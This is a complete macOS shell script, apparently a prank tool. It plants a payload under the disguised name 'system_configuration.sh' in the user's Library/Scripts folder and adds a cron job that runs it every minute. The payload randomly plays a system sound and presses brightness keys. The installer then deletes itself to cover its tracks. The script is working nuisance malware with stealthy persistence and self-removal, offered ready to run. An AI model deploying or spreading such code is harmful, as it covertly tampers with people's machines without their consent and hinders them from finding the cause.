#!/bin/bash

FILE="$HOME/Library/Scripts/system_configuration.sh"
touch $FILE

/bin/cat <<EOM >$FILE
#!/bin/bash

osascript <<EOD
set turnUp to 145
set turnDown to 144

tell application "System Events"
	set rn to random number from 1 to 100
	set rtimes to random number from 1 to 4
	
	set vol to output volume of (get volume settings)
	set volume output volume 10
	
	repeat rtimes times
		do shell script "afplay -r 1 /System/Library/Sounds/Tink.aiff > /dev/null 2>&1 &"
		
		if rn is less than 50 then
			key code turnDown
		else
			key code turnUp
		end if
		
		delay 0.08
	end repeat
	
	delay 0.08
	set volume output volume vol
	
end tell
EOD
EOM

crontab -l > tmpcron
echo "*/1 * * * * sh $FILE >/dev/null 2>&1" >> tmpcron

crontab tmpcron
rm tmpcron

rm -- "$0"